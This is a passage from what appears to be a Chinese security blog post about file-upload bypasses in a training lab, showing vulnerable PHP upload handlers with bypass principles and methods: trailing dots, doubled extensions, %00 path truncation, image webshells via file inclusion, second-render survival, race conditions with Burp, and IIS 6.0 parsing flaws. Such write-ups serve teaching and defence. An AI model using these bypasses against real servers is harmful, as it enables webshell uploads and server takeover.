array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有匹配完全 只删除文件名末尾的 . 绕过方法： 上传文件后缀加. . 文件上传——文件名双写绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; 绕过原理： 程序仅仅对黑名单内的后缀名进行字符替换，且没有预处理只替换一次 绕过方法： 上传文件的文件后缀名双写可进行绕过检测 文件上传——%00截断绕过(GET) 后端代码 $is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; 绕过原理： 程序使用白名单限制，通过拼接路径和文件名来进行存储 且 拼接的路径和文件名均可变 绕过方法： 路径处进行%00截断绕过 文件上传——%00截断绕过(POST) 后端代码 $is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 绕过原理： 大部分跟上面的相似，但POST传输的数据（%00）不可以自动解析进行截断 绕过方法： burp自带hex编码，将php后面的一组数改为00 文件上传——简单的上传图片马进行绕过（利用文件包含漏洞） 后端代码： function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 绕过原理： 文件包含漏洞在加载文件时统一解析为该服务器所处理的脚本文件 绕过方法： http://*.*.*.*/upload.php?file=xiaoma.jpg (访问上传的小马文件即可，相对路径) 文件上传——二次渲染绕过（利用文件包含漏洞） 后端代码 &lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125;?&gt; 绕过原理： 源文件与上传文件虽然会进行二次渲染，但分析后呢 两个文件仍会有相同的16进制编码部分 绕过方法： 生成一个普通的gif文件（文件尽量大一些容易找到相同编码的部分） 将最初的图片文件命名为test.gif 上传后的图片命名为test2.gif 利用010Editor将两图片进行比较，找到相同的部分 在蓝色部分随便挑选一个位置写入 上传修改文件后利用文件包含漏洞进行访问 文件上传——条件竞争绕过 后端代码 $is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; 绕过原理： 这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。 绕过方法: 利用burp抓到上传文件的数据包进行循环发送 构造上传路径进行循环访问（http://*.*.*.*/upload/php.php）,步骤与上述相同 访问大量上传包中的最大包 文件上传——IIS 6/0 解析漏洞导致上传绕过这里是代码，只有聪明的人才看得见（谁知道我写完之后自己也看不见了） 科普一下IIS解析漏洞： IIS6.0解析漏洞分两种1、目录解析以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。2、文件解析*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx","categories":[{"name":"各类漏洞收集整理","slug":"各类漏洞收集整理","permalink":"http://yoursite.com/categories/%E5%90%84%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86/"}],"tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"},{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"文件上传","slug":"文件上传","permalink":"http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]}]}